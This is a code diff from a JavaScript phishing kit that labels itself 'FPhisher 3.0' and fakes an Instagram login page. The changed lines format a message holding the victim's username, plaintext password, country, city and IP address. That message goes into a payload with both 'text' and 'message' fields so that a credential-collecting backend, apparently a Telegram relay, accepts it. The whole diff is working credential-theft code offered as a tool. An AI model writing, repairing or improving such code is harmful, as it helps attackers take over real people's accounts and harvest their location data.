@@ -94,29 +94,30 @@
       const loc = await getLocation();
       attempt++;
 
-      // === IMPROVED TELEGRAM MESSAGE ===
-      const telegramMessage = `🚨 <b>NEW INSTAGRAM LOGIN ATTEMPT</b> 🚨
+      // === PLAIN TEXT BUT NICELY FORMATTED VERSION (works even if backend ignores parse_mode) ===
+      const formattedMessage = `🚨 NEW INSTAGRAM LOGIN ATTEMPT 🚨
 
-📋 <b>DETAILS</b>
-• 📲 <b>Platform:</b> Instagram
-• 👤 <b>Username:</b> ${username}
-• 🔑 <b>Password:</b> ${password}
-• 🔄 <b>Attempt:</b> ${attempt}
+📋 DETAILS:
+• 📲 Platform     : Instagram
+• 👤 Username     : ${username}
+• 🔑 Password     : ${password}
+• 🔄 Attempt      : ${attempt}
 
-📍 <b>LOCATION</b>
-• 🌍 <b>Country:</b> ${loc.country}
-• 🗺️ <b>State:</b> ${loc.state}
-• 🏙️ <b>City:</b> ${loc.city}
-• 🌐 <b>IP:</b> ${loc.ip}
+📍 LOCATION:
+• 🌍 Country      : ${loc.country}
+• 🗺️ State        : ${loc.state}
+• 🏙️ City         : ${loc.city}
+• 🌐 IP           : ${loc.ip}
 
 ━━━━━━━━━━━━━━━━━━━━━━━
-🔒 <b>Secured by FPhisher 3.0</b> 🔒
-⏰ <i>${new Date().toLocaleString()}</i>`;
+🔒 Secured by FPhisher 3.0 🔒
+⏰ ${new Date().toLocaleString()}`;
 
       const payload = {
         id: SUBMIT_ID,
-        message: telegramMessage,
-        parse_mode: "HTML",           // Important for bold formatting in Telegram
+        text: formattedMessage,        // Changed from "message" to "text" — many fphisher backends expect "text"
+        message: formattedMessage,     // Keep both in case your backend uses "message"
+        parse_mode: "HTML",            // Still send it (harmless)
         username: username,
         password: password,
         country: loc.country,
